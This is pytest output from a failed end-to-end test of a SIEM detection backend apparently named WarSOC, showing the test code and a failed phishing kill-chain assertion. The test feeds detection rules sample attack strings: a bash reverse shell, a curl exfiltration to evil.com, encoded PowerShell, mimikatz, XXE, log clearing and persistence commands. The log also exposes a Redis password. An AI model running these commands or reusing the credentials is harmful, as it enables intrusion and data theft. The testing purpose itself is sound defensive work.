startup-backend-worker-siem-1
startup-backend-worker-siem-2
startup-backend-worker-siem-3
warsoc-worker-fbr
warsoc-worker-peca
 [WarSOC Config] Loaded custom rules from C:\Users\Lenovo\Desktop\Startup-backend\app\config\config.json
[WARN] MemoryLimitMiddleware disabled in non-production environment for local testing.
DEBUG DB NAME: WarSOC_DB
DEBUG ALL ALERT TYPES: ['WEB-WAF_KEYWORD_MATCH', 'WEB-WAF_KEYWORD_MATCH', 'PATH_TRAVERSAL', 'POWERSHELL_OBFUSCATION', 'LATERAL_MOVEMENT', 'LOG_EVASION', 'REVERSE_SHELL', 'WIN_EVENT_4660_DETECTED', 'PERSISTENCE', 'WIN_EVENT_4660_DETECTED', 'DATA_EXFILTRATION', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'STAGING', 'WIN_EVENT_4660_DETECTED', 'WINDOWS-SEC_KEYWORD_MATCH', 'WIN_EVENT_4660_DETECTED', 'XXE_INJECTION', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'MALWARE_EXECUTION', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED', 'Mass file deletion detected', 'WIN_EVENT_4660_DETECTED', 'WIN_EVENT_4660_DETECTED']
DEBUG TOTAL ALERTS FOUND: 65
DEBUG STATS: phishing=0, port_scan=0, deletion=1
F
================================== FAILURES ===================================
_________________________ test_all_catalog_rules_e2e __________________________

clean_slate = None
mock_tenant_a = {'agent_id': 'WARSOC_TENANT_A_AGENT', 'hostname': 'tenant_a-host', 'password': 'Password123!', 'plan_type': 'Enterprise', ...}
mongo_client = AsyncIOMotorClient(MongoClient(host=['127.0.0.1:27017'], document_class=dict, tz_aware=False, connect=False, authsource='admin', driver=DriverInfo(name='Motor', version='3.7.1', platform='asyncio')))
redis_client = <redis.asyncio.client.Redis(<redis.asyncio.connection.ConnectionPool(<redis.asyncio.connection.Connection(decode_responses=True,password=W4rS0c_R3d1s_S3cur3_v3_9k8R4tMz5lW2nX,host=127.0.0.1,port=6379)>)>)>

    @pytest.mark.asyncio
    @pytest.mark.skipif(not _e2e_enabled(), reason="Set E2E=1 to run the full end-to-end validation.")
    async def test_all_catalog_rules_e2e(clean_slate, mock_tenant_a, mongo_client, redis_client):
        settings_db = mongo_client[os.getenv("MONGO_DB_NAME", "WarSOC_DB")]
    
        import subprocess
        # Restart workers to ensure they load the new mock_tenant_a config from the DB
        subprocess.run(["docker", "restart", "startup-backend-worker-siem-1", "startup-backend-worker-siem-2", "startup-backend-worker-siem-3", "warsoc-worker-fbr", "warsoc-worker-peca"], check=True)
        # Wait a bit for them to connect to Redis
        await asyncio.sleep(5)
    
        async with httpx.AsyncClient(base_url=API_BASE_URL, follow_redirects=True, timeout=DEFAULT_TIMEOUT, cookies=httpx.Cookies()) as client:
            await _login_agent(client, mock_tenant_a["agent_id"], mock_tenant_a["private_key_pem"], mock_tenant_a["tenant_id"])
    
            dynamic_rules = SIEM_RULES["detection"]["rules"]
            # Generate payloads for dynamic rules
            dynamic_events = []
            for rule_name, rule_config in dynamic_rules.items():
                # Create a string that matches the rule's requirements
                # We construct a generic string that contains required keywords to hit MANDATE 2
                message = ""
                if "must_include_any" in rule_config:
                    message += rule_config["must_include_any"][0] + " "
    
                # Map rule to a specific message that matches its regex
                regex_matches = {
                    "SQL_INJECTION": "union select * from users",
                    "XSS_ATTACK": "<script>alert(1)</script>",
                    "COMMAND_INJECTION": "; whoami",
                    "PATH_TRAVERSAL": "../../../etc/passwd",
                    "POWERSHELL_OBFUSCATION": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA",
                    "PRIVILEGE_ESCALATION": "sudo su -",
                    "LATERAL_MOVEMENT": "net use \\\\192.168.1.10\\c$",
                    "LOG_EVASION": "wevtutil cl system",
                    "REVERSE_SHELL": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                    "RECON_COMMANDS": "whoami",
                    "PERSISTENCE": "schtasks /create /tn persist",
                    "DATA_EXFILTRATION": "curl -X POST -d @secret.txt http://evil.com",
                    "STAGING": "tar -czf /tmp/data.tar.gz /sensitive",
                    "BRUTE_FORCE_PATTERN": "failed password for root",
                    "XXE_INJECTION": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                    "MALWARE_EXECUTION": "mimikatz.exe privilege::debug",
                    "SIEM-FW-001": "firewall connection blocked 5156"
                }
    
                message += regex_matches.get(rule_name, rule_name)
    
                # Ensure it meets min length
                if "min_message_length" in rule_config:
                    while len(message) < rule_config["min_message_length"]:
                        message += " padding"
    
                dynamic_events.append(_http_event(
                    event_id=1,
                    event_uid=str(uuid.uuid4()),
                    tenant_id=mock_tenant_a["tenant_id"],
                    agent_id=mock_tenant_a["agent_id"],
                    message=message,
                    source_ip="10.50.60.70",
                    private_key_pem=mock_tenant_a["private_key_pem"],
                    user="attacker"
                ))
    
            # Send Dynamic Rule Events
            resp = await client.post("/ingest/pulse", json=dynamic_events, timeout=10.0)
            assert resp.status_code == 200
    
            # Now test some Stateful Rules (e.g., Phishing Kill Chain, Horizontal Port Scan)
            stateful_events = []
    
            # 1. Phishing Kill Chain (needs 2 stages)
            stateful_events.append(_http_event(2, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], "verify your account via http://evil.com", "10.0.0.99", mock_tenant_a["private_key_pem"], user="victim"))
            stateful_events.append(_http_event(3, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], "wscript.exe executed payload", "10.0.0.99", mock_tenant_a["private_key_pem"], user="victim"))
    
            # 2. Horizontal Port Scan (10 events, unique destination IP)
            for i in range(11):
                stateful_events.append(_http_event(4, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], f"network connection to 192.168.1.{i}", "10.1.1.1", mock_tenant_a["private_key_pem"], user="scanner"))
                # Manipulate raw_event_data so SIEM logic parses it
                stateful_events[-1]["raw_data"]["destination_ip"] = f"192.168.1.{i}"
    
            # 3. Mass File Deletion (50 events)
            for i in range(51):
                stateful_events.append(_http_event(4660, str(uuid.uuid4()), mock_tenant_a["tenant_id"], mock_tenant_a["agent_id"], f"deleted file_{i}.txt", "10.2.2.2", mock_tenant_a["private_key_pem"], user="deleter"))
    
            resp = await client.post("/ingest/pulse", json=stateful_events, timeout=10.0)
            assert resp.status_code == 200
    
            # Wait for workers to process everything
            await asyncio.sleep(20)
    
            # Validate Database
            print(f"DEBUG DB NAME: {settings_db.name}")
            total_alerts = await settings_db["security_alerts"].count_documents({"tenant_id": mock_tenant_a["tenant_id"]})
            all_alerts = await settings_db["security_alerts"].find({"tenant_id": mock_tenant_a["tenant_id"]}).to_list(None)
            print(f"DEBUG ALL ALERT TYPES: {[a.get('type') for a in all_alerts]}")
    
            # We should have at least 1 alert per dynamic rule, plus stateful alerts
            expected_minimum = len(dynamic_rules) + 3
            print(f"DEBUG TOTAL ALERTS FOUND: {total_alerts}")
    
            # Check specific stateful alerts
            phishing = await settings_db["security_alerts"].count_documents({"type": {"$regex": "phishing", "$options": "i"}})
            port_scan = await settings_db["security_alerts"].count_documents({"type": {"$regex": "scan", "$options": "i"}})
            deletion = await settings_db["security_alerts"].count_documents({"type": {"$regex": "deletion", "$options": "i"}})
    
            print(f"DEBUG STATS: phishing={phishing}, port_scan={port_scan}, deletion={deletion}")
    
            assert total_alerts >= expected_minimum, f"Expected at least {expected_minimum} alerts, got {total_alerts}"
>           assert phishing >= 1, "Phishing Kill Chain failed"
E           AssertionError: Phishing Kill Chain failed
E           assert 0 >= 1

tests\mega_suite\test_12_all_rules_catalog.py:163: AssertionError
============================== warnings summary ===============================
app\config\config.py:12
  C:\Users\Lenovo\Desktop\Startup-backend\app\config\config.py:12: PydanticDeprecatedSince20: Support for class-based `config` is deprecated, use ConfigDict instead. Deprecated in Pydantic V2.0 to be removed in V3.0. See Pydantic V2 Migration Guide at https://errors.pydantic.dev/2.12/migration/
    class Settings(BaseSettings):

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================== short test summary info ===========================
FAILED tests/mega_suite/test_12_all_rules_catalog.py::test_all_catalog_rules_e2e
1 failed, 1 warning in 42.02s
